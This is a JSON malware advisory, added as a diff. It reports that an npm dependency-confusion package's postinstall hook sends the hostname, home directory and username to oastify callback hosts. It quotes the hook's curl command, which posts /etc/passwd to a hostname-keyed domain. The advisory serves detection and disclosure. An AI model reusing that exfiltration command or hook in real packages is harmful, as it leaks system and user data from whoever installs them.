@@ -1,0 +1,64 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-1223",
+  "aliases": [
+    "MAL-2026-5409"
+  ],
+  "modified": "2026-05-29T21:45:08Z",
+  "published": "2026-05-29T15:31:06Z",
+  "summary": "Malicious code in @easy-entry/outside-registration-fop-navigator (npm)",
+  "details": "Dependency-confusion stub: @easy-entry/outside-registration-fop-navigator uses sentinel version 99.9.5, an 834-byte tarball with no README. A malicious postinstall hook runs (1) node scripts/scream3gg.js, which exfiltrates os.hostname(), os.homedir(), and os.userInfo().username hex-encoded to nmd25sur8sjp60lm75dp67e2gtmkaayz[.]oastify[.]com, and (2) /usr/bin/curl --data '@/etc/passwd' $(hostname).200hj786m7x4kfz1lkr4kmshu80zoqcf[.]oastify[.]com, which leaks /etc/passwd. Both destinations are oastify[.]com OOB callback hosts. A @easy-entry-scoped package whose postinstall runs node scripts/scream3gg.js followed by curl --data '@/etc/passwd' $(hostname).200hj786m7x4kfz1lkr4kmshu80zoqcf[.]oastify[.]com. Stage one sends hex-encoded hostname/homedir/username via fetch to nmd25sur8sjp60lm75dp67e2gtmkaayz[.]oastify[.]com; stage two exfiltrates /etc/passwd, keyed on hostname for per-victim tracking.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@easy-entry/outside-registration-fop-navigator",
+        "purl": "pkg:npm/%40easy-entry/outside-registration-fop-navigator@99.9.5"
+      },
+      "versions": [
+        "99.9.5"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@easy-entry/outside-registration-fop-navigator/v/99.9.5"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-1223"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-05-29T15:31:06Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "200hj786m7x4kfz1lkr4kmshu80zoqcf[.]oastify[.]com",
+          "nmd25sur8sjp60lm75dp67e2gtmkaayz[.]oastify[.]com",
+          "oastify[.]com"
+        ]
+      }
+    }
+  }
+}
